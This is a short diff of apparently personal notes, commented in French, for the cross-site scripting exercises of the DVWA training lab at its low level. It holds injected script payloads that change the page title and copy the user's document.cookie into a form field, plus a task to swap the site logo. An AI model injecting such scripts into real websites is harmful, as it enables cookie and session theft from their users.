@@ -1,4 +1,5 @@
 /*LOW*/
+///on change la taille de l'input en affichant le code
 //modifiez le titre de la page afin qu’il affiche votre nom
 <script type="text/javascript">
    document.title = 'bchanez';
@@ -6,9 +7,8 @@
 
 
 //inserez le cookie de l’utilisateur dans le commentaire
-///on change la taille de l'input en affichant le code
 <script type="text/javascript">
-   (String)document.cookie;
+   document.getElementById(this).value = document.cookie;
 </script>
 
 //remplacez le logo de DVWA par celle-ci: http://i.imgur.com/soPydKo.gif
